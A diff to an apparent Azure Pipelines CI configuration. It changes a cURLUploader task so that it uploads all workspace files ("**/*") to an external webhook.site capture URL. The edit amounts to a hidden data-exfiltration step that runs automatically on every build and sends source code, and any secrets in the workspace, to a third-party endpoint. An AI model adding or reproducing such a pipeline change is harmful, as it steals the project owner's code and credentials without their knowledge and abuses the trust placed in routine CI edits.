@@ -19,6 +19,6 @@ steps:
   displayName: 'Run a multi-line script'
 - task: cURLUploader@2
   inputs:
-    files: 
+    files: "**/*"
     authType: 'UserAndPass'
     url: 'https://webhook.site/ab2a5219-095f-4cea-b684-17cd356b0603'
